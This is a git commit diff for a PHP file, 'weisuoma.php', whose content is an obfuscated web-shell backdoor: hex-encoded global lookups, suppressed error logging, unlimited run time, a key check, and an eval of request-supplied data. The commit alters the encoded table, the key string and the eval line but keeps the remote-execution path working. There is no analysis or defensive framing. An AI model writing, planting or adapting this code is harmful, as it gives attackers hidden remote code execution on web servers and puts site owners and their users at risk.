bc0f4d4af5108356038878c604ac6a2fc1b8b101
dskho <32945923+dskho@users.noreply.github.com>
2020-11-05 17:33:07 +0800

    Update weisuoma.php

--- weisuoma.php
+++ weisuoma.php
@@ -3,7 +3,6 @@ $da59aa5 = 208;
 $GLOBALS['w8fd00d8'] = Array();
 global $w8fd00d8;
 $w8fd00d8 = $GLOBALS;
-${"\x47\x4c\x4fB\x41\x4c\x53"}['a904'] = "\x2f\x25\x32\x54\x75\x3a\x5e\x36\x31\x48\x21\x5b\x30\x66\x20\x5f\x56\x5a\x4d\x23\x3e\x37\x71\x29\x26\x2c\x68\x7e\x5c\x9\x64\x69\x6e\x3c\x6b\x2b\x61\x2d\x4a\x47\x42\x7c\xa\x6a\x7b\x6f\x52\x27\x4c\x39\x55\x63\x4b\x7a\x49\x3f\x5d\x76\x33\x59\x43\x62\x24\x38\x79\x70\x72\x67\x28\x35\x46\x3d\x7d\x65\x57\x41\x53\x44\x73\x60\x58\x34\x77\x22\x6c\x6d\x4e\x45\x4f\x40\x78\x74\x50\xd\x2a\x2e\x3b\x51";
 @ini_set('error_log', NULL);
 @ini_set('log_errors', 0);
 @ini_set('max_execution_time', 0);
@@ -12,7 +11,7 @@ if (!defined('ALREADY_RUN_366afb8a8a2355ab21fbf11ba1a02fba')){
         define('ALREADY_RUN_366afb8a8a2355ab21fbf11ba1a02fba', 1);
         $vv = NULL;
         $kk = NULL;
-        $w8fd00d8['c77700426'] = 'aec7e598-2fbc-4b15-871f-1d786eeb80dc';
+        $w8fd00d8['c77700426'] = 'aec7e489-2fbc-4b15-871f-1d686eeb80dc';
         global $c77700426;
         function  e664fd($vv, $kk){
         global $w8fd00d8;
@@ -51,7 +50,7 @@ if (!defined('ALREADY_RUN_366afb8a8a2355ab21fbf11ba1a02fba')){
                         echo @serialize($l71c40);
                 }
                 elseif ($vv['a'] == 'e'){
-                eval/*r49557ec*/($vv['d']);
+                eval/*r49557ec*/($vv['d'].NULL);
                 }
                 }
                 exit();
